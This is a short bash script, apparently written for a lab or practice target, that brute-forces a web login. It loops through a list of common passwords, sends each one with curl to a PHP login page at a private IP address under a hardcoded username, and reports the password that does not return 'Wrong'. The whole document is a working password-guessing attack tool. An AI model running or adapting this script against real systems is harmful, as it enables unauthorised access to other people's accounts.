base="http://192.168.3.151/index.php?username=furkan.paligu&password="
passwordList="100common.txt"

guess=""

while read -r line
do
	guess=$(curl -s "${base}""$line" | grep "Wrong")
	if [[ -z "${guess}" ]]
	then
		echo "Password is:" "$line"
	fi
done < "$passwordList"
